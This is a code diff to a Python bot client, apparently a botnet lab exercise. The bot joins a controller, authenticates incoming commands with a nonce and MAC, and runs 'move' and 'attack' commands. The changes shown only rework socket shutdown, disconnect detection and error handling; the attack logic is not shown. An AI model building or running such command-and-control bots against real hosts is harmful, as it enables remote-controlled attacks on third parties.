@@ -67,6 +67,7 @@ def execute_attack_cmd(hostname, port, nick, nonce, sock):
 def execute_move_cmd(hostname, port, nick, sock, secret):
     msg = f'-move {nick}\n'
     sock.sendall(msg.encode())
+    sock.shutdown(socket.SHUT_WR)
     sock.close()
     return True, [hostname, port]
     
@@ -110,8 +111,9 @@ def start_bot(hostname, port, nick, secret):
             print("Connected to", hostname, port)
             join_msg = f'-joined {nick}\n'
             sock.sendall(join_msg.encode())
+            connected = True
             # <nonce> <mac> <command> <argument1> <argument2>
-            while (True):
+            while (connected):
                 msg = sock.recv(1024).decode('ascii').split()
                 print(f"received: {msg}")
                 if len(msg) >= 3 and authenticate_cmd(msg[0], msg[1], secret):
@@ -120,13 +122,21 @@ def start_bot(hostname, port, nick, secret):
                     if res:
                         num_cmds_executed += 1
                         if len(args) > 0:
-                            print("args", args)
                             hostname, port = args
-                            print("hostname and port: ", hostname, port)
+                            print("connecting to", hostname, port)
+                            
+                elif msg == []:
+                    connected = False
+                    print('disconnected')
                 else:
-                    print('message ignored')
+                    print("message ignored")
         except socket.timeout:
             print("Connection timed out. Attempting to reconnect...")
+        except OSError as e:
+            if e.errno == 9: # ignore
+                pass
+            else:
+                print(e)
         except Exception as e:
             print(e)
         time.sleep(5)
